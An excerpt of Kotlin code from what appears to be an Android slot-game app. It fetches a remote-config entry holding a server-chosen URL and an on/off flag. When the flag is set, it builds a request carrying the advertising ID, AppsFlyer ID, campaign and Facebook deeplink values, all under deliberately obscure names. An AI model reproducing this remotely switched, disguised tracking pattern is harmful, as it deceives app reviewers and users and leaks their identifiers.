...
import aer.com.gamesas.mobile.slot.game.utils.Completer
                        ...
                        Firebase.remoteConfig.apply {
                            ...
                            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                                if (task.isSuccessful) {
                                    val jsonStr = getString("Matter")
                                    log("success = $jsonStr")
                                    JSONObject(jsonStr).also { jsonObj ->
                                        coroutine.launch(Dispatchers.IO) {
                                            getRickiMorty(jsonObj.getString("mud"), jsonObj.getBoolean("belong"))
                                        }
                                    }
        ...
        if (belong) {
            withContext(Dispatchers.Main) {
                val completer = Completer(coroutine, 2) {
                    ...
                    val rrroce = mud + "?" +
                            "asitgd=${advertisingId}&" +
                            "a_fyr_id=${appsflyerUID}&" +
                            "c_nign=${AppsflyerUtil.campaignFlow.value}&" +
                            "lide_p=${FacebookUtil.deeplinkFlow.value}"
